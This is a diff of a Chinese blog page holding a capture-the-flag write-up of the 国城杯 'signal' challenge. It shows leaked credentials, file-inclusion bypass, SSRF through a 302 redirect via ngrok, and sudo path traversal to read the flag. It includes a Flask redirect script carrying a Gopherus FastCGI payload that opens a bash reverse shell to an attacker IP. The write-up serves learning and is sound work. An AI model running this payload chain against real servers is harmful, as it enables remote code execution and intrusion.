@@ -223,16 +223,16 @@
         <div class="post-content">
             <h2 id="国城杯复现"><a href="#国城杯复现" class="headerlink" title="国城杯复现"></a>国城杯复现</h2><h4 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h4><p>提示：cgi</p>
 <p>显示一个登录框，还是信息搜集</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211214748477.png" alt="image-20241211214748477"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202118326.png" alt="image-20250220211829084"></p>
 <p>用dirsearch搜索到index.php.swp:</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211214840817.png" alt="image-20241211214840817"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202118338.png" alt="image-20250220211856238"></p>
 <p>获取这个拿到信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest:MyF3iend</span><br></pre></td></tr></table></figure>
 
 <p>登录：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211214958561.png" alt="image-20241211214958561"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202119667.png" alt="image-20250220211908376"></p>
 <p>可以目录穿越读flag，但是是假的</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211215033684.png" alt="image-20241211215033684"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202124364.png" alt="image-20250220212409239"></p>
 <p>开始尝试包含文件，发现包含admin.php文件会直接跳转回index.php页面，说明php代码是被解析了  的，所以可以知道后端就是Include函数来包含的，因为这里解析了php代码，所以现在就是看如何进行 文件包含，并且是需要将其编码输出才能成功文件包含读取代码。</p>
 <p>其实这里是有几个非预期的，比如fileter chian、侧信道读取文件等，然后设置为只能get传参，禁了很 多filter chain需要用的过滤器的部分的字符，想着fuzz都很难fuzz出来，所以也是打不了的（想着可以 报419的错误），这里为了禁这些非预期是下了狠手的，虽然只是一个简单的二次编码绕过的考点。所 以直接像下面这个这样传参即可（ps：还是没防住，忘了禁读guest.php了，导致明牌waf，被filter</p>
 <p>chain非预期了）：</p>
@@ -246,55 +246,55 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>); <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br></pre></td></tr></table></figure>
 
 <p>发现是允许跟随302跳转的，并且是接受POST传参url的，但是是加了session验证的，所以是需要知道 怎么登陆进这个admin页面的，所以现在是需要找在哪里可以得到admin的账户。继续信息收集，可以 在最开始的登录页面的源代码中看到如下代码：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211215448844.png" alt="image-20241211215448844"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202124034.png" alt="image-20250220212422934"></p>
 <p>这还有个php，读一下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$users</span> = [</span><br><span class="line"><span class="string">&#x27;admin&#x27;</span> =&gt; <span class="string">&#x27;FetxRuFebAdm4nHace&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;guest&#x27;</span> =&gt; <span class="string">&#x27;MyF3iend&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$users</span>[<span class="variable">$username</span>]) &amp;&amp; <span class="variable">$users</span>[<span class="variable">$username</span>] === <span class="variable">$password</span>) &#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: admin.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: guest.php&#x27;</span>); &#125;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Invalid username or password&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>); <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Please fill in the username and password&#x27;</span>; <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">   <span class="keyword">exit</span>();</span><br><span class="line">   </span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>得到账号，登录admin</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211215553406.png" alt="image-20241211215553406"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202124477.png" alt="image-20250220212438323"></p>
 <p>获得这个东西，可以进行ssrf，因为admin.php源码是说的可以进行302跳转的，我们可以进行ssrf302跳转，然而只能用https协议</p>
 <p>就得用ngrok这个来将http转成https来进行绕过</p>
 <p>ssrf：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211215854696.png" alt="image-20241211215854696"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125507.png" alt="image-20241211215854696"></p>
 <p>通过用公网地址让靶机访问公网的服务器，然后公网机给一个127.0.0.1访问靶机的内容，这里可以用**<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>**来进行shell反弹（就是命令执行）</p>
 <p>由于ngrok的特殊性，使得用于的公网机可以是自己的私网地址，我用的就是自己的kali</p>
 <p>用gopherus来获得payload:</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211220321397.png" alt="image-20241211220321397"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202124642.png" alt="image-20241211220321397"></p>
 <p>将其贴入</p>
 <p>python脚本：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, redirect </span><br><span class="line">app =Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def indexRedirect():</span><br><span class="line">    redirectUrl =&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH105%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/admin.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00i%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/【IP】/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span><br><span class="line">    return redirect(redirectUrl)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, port=8080, debug=True)</span><br></pre></td></tr></table></figure>
 
 <p>在kali里面运行python脚本：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211220509309.png" alt="image-20241211220509309"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125508.png" alt="image-20241211220509309"></p>
 <p>再运行ngrok：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211220530102.png" alt="image-20241211220530102"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125509.png" alt="image-20241211220530102"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngrok http 8080</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211220555879.png" alt="image-20241211220555879"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125511.png" alt="image-20241211220555879"></p>
 <p>可以看见已经变成https的公网地址</p>
 <p>直接放入admin.php中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://6b43-111-22-76-69.ngrok-free.app</span><br></pre></td></tr></table></figure>
 
 <p>submit</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211221201883.png" alt="image-20241211221201883"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125512.png" alt="image-20241211221201883"></p>
 <p>谈到了：</p>
 <p>但是cat 不了flag(没找到)：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
 
 <p>寻找所有带有flag名字的文件</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211221310459.png" alt="image-20241211221310459"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125513.png" alt="image-20241211221310459"></p>
 <p>找到这个flag：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211221327004.png" alt="image-20241211221327004"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125514.png" alt="image-20241211221327004"></p>
 <p>再次提示不是这个flag</p>
 <p>还没有权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211221438025.png" alt="image-20241211221438025"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125515.png" alt="image-20241211221438025"></p>
 <p>因为此处无密码sudo的cat可读路径用了*进行通配，所以可以尝试目录穿越，如下读取flag即可：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /tmp/whereflag/../../../root/flag</span><br></pre></td></tr></table></figure>
 
 <p>最后获取flag：</p>
-<p><img src="C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20241211221603553.png" alt="image-20241211221603553"></p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202502202125516.png" alt="image-20241211221603553"></p>
 <p>爽啦！（终于复现了一道难的题目，555）</p>
 
         </div>
@@ -346,6 +346,8 @@
             </div>
         </section>
         <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/">[NewStarCTF2023公开赛道]EasyLogin</a>
             
             
             <a class="next" rel="next" href="/2024/12/10/De1CTF-2019-Giftbox/">[De1CTF_2019]Giftbox</a>
